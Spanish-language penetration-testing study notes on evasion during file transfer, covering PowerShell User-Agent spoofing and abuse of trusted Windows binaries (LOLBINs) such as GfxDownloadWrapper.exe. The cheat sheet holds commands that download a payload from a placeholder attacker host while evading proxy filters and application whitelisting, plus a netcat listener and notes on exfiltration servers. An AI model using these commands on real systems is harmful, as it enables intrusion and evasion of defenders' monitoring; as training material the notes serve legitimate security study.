---
tags:
  - evasion
  - filetransfer
---
## Conceptos Clave (TL;DR)

* La modificación del parámetro User-Agent en solicitudes web (como las realizadas con PowerShell) permite simular navegadores legítimos y evadir listas negras implementadas por administradores o defensores.

* Las medidas defensivas como el "Application Whitelisting" y el registro de la línea de comandos pueden alertar sobre el uso de binarios comunes como PowerShell o Netcat.

* Para evadir estos controles, se recomienda el uso de LOLBINs (Living Off the Land Binaries) o "binarios de confianza mal ubicados", los cuales ya existen en el sistema objetivo y pueden ser abusados para acciones como la descarga de archivos sin generar alertas.

* Existen repositorios públicos de estas técnicas: el proyecto LOLBAS para Windows y el proyecto GTFOBins para Linux.

### Herramientas Clave

* **Invoke-WebRequest (PowerShell):** Utilizado para transferir archivos HTTP/HTTPS, con capacidad nativa para alterar el User-Agent.
* **GfxDownloadWrapper.exe:** Ejemplo de un LOLBIN (Intel Graphics Driver) en sistemas Windows que posee funcionalidades de descarga.
* **LOLBAS / GTFOBins:** Sitios de referencia obligatoria para identificar binarios nativos explotables durante una intrusión.
* **Certutil:** Binario nativo de Windows útil para enumeración adicional y descargas en sistemas donde se ha obtenido una webshell.
* **Impacket SMB Server / Python Web Server:** Herramientas para levantar servidores en la máquina atacante con el fin de exfiltrar o recibir archivos desde el objetivo.

### Metodología Paso a Paso

* **Fase 1: Evasión mediante alteración de User-Agent**

&#x20; Si el vector inicial de transferencia de archivos mediante comandos estándar es bloqueado o genera errores de conexión, es probable que un firewall o proxy esté filtrando el User-Agent por defecto de PowerShell. La solución consiste en enumerar los User-Agents disponibles en la clase nativa y aplicar uno de un navegador estándar (ej. Chrome) a la solicitud para mimetizar el tráfico con la navegación de un usuario normal.

* **Fase 2: Ejecución e identificación de LOLBINs**

&#x20; Si las políticas del sistema impiden la ejecución de utilidades como Netcat o restringen severamente PowerShell (Application Whitelisting), la alternativa es buscar binarios firmados y confiables preinstalados en el equipo. Se debe identificar qué binarios están disponibles y luego consultar las plataformas LOLBAS o GTFOBins para encontrar la sintaxis exacta que permita abusar de dicho binario para la transferencia del payload.

### Cheat Sheet de Comandos

```powershell
# Lista todas las propiedades y User-Agents predefinidos en la clase PSUserAgent (Internet Explorer, Firefox, Chrome, Opera, Safari)

[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

```powershell
# Define una variable con el User-Agent de Chrome

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

```powershell
# Ejecuta la descarga web utilizando el User-Agent modificado para evadir filtros perimetrales

Invoke-WebRequest http://<ATTACKER_IP>:<PORT>/<FILE_NAME> -UserAgent $UserAgent -OutFile "C:\<PATH>\<FILE_NAME>"
```

```bash
# Inicia un listener en la máquina atacante para verificar la recepción de la petición HTTP o servir el archivo

nc -lvnp <PORT>
```

```powershell
# Abusa del LOLBIN GfxDownloadWrapper.exe (si está presente) para descargar un archivo evadiendo Application Whitelisting

GfxDownloadWrapper.exe "http://<ATTACKER_IP>:<PORT>/<PAYLOAD_NAME>" "C:\<PATH>\<FILE_NAME>"
```

### "Gotchas" y Troubleshooting

* **Alerta de defensores:** El uso de comandos directos como `Invoke-WebRequest` sin ofuscación puede dejar rastros evidentes en los logs de línea de comandos (Event ID 4688 o logs de Script Block de PowerShell), alertando a los analistas de seguridad.
* **Bloqueos por Whitelisting:** Si recibes errores de acceso denegado o comandos no reconocidos al usar Netcat o PowerShell, asume que hay controles de Application Whitelisting activos; pivota inmediatamente a buscar alternativas en LOLBAS/GTFOBins.
* **Disponibilidad de binarios:** No todos los LOLBINs documentados estarán en todos los sistemas. Por ejemplo, `GfxDownloadWrapper.exe` depende de que el driver gráfico de Intel esté instalado en ese host Windows 10 en particular. Revisa siempre el entorno local antes de intentar la ejecución.
* **Múltiples métodos de exfiltración:** Si se requiere extraer información, un servidor SMB de Impacket o un servidor Python con capacidades de carga (upload) suelen ser vías más estables que forzar subidas mediante LOLBINs.
